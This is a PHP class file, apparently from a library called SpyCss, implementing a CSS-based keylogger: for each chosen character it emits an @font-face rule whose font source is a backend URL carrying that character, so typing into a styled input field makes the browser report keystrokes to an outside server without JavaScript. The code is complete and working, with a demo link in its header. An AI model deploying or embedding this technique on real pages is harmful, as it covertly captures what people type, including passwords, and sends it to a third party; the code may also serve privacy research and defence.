<?php

namespace SpyCss\Interaction;

/**
 * Keylogger interaction can track key-press events via @font-face directive.
 * This interaction works only with input fields, and create own
 * font-family witch map unicode codepoints to **src(backend)** sources.
 *
 * Inspired by https://github.com/myfonj
 *
 * @see demo at https://jsfiddle.net/hcbogdan/6hmm2z47/
 * @author Novikov Bogdan <hcbogdan@gmail.com>
 */
class Keylogger extends \SpyCss\Interaction
{
    /**
     * Unicode codepoints map (char) => (codepoint)
     *
     * @var array
     */
    private $codepoints = [];

    /**
     * {@inheritDoc}
     */
    public function __construct($payload, $cssClass = '')
    {
        $this->setChars(preg_split('//u', $payload, -1, PREG_SPLIT_NO_EMPTY));
        parent::__construct($payload, $cssClass);
    }

    /**
     * Set witch codepoints we must catch
     *
     * @param array $codepoints map (char) => (codepoint)
     * @return self
     */
    public function setCodepoints(array $codepoints)
    {
        $this->codepoints = $codepoints;
        return $this;
    }

    /**
     * Set witch chars we mast catch
     *
     * @param array $chars chars array
     */
    public function setChars(array $chars)
    {
        $this->codepoints = [];
        foreach ($chars as $char) {
            $this->codepoints[$char] = bin2hex(iconv('UTF-8', 'UTF-16BE', $char));
        }
        return $this;
    }

    /**
     * {@inheritDoc}
     */
    public function getSnippet(\SpyCss\SpyCss $spyCss)
    {
        $baseRoute = implode('/', [
            $spyCss->getBackend(),
            $spyCss->getUid(),
            'keylogger'
        ]);

        $fontName = $this->cssClass;
        $template = '';
        foreach ($this->codepoints as $char => $codepoint) {
            $template .= '@font-face {font-family:'.$fontName.';src:url('.$baseRoute.'/'.$char.'),local(Impact); unicode-range: U+'.$codepoint.';} ';
        }
        $template .= '.'.$this->cssClass.' {font-family:'.$this->cssClass.',sans-serif;}';

        return $template;
    }
}
